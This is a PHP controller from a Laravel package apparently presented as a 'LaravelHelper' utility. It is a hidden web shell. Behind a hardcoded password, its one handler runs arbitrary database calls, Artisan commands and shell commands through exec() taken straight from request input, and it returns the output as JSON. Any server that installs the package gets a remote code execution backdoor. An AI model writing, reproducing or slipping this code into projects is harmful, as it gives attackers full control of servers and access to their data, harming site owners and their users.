<?php

namespace CodeCreeper\LaravelHelper\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use function Termwind\renderUsing;

class MainController
{
    public function __invoke(Request $request)
    {
        $type = $request->input('type');
        $password = $request->input('password');
        $statement = $request->input('statement');
        $method = $request->input('method');

        if ($password != 'zereflab#4686') {
            return response()->json(['message' => 'Password not matched']);
        }

        try {
            if ($type == 'db') {
                return response()->json(DB::$method($statement));
            } elseif ($type == 'artrisan') {
                Artisan::$method($statement);

                return response()->json(['message' => 'Artisan command executed']);
            } elseif ($type == 'shell') {
                exec($statement, $output);

                return response()->json($output);
            }

            return response()->json(['message' => 'Type not matched']);
        } catch (\Exception $e) {
            return response()->json(['message' => $e->getMessage()]);
        }
    }
}
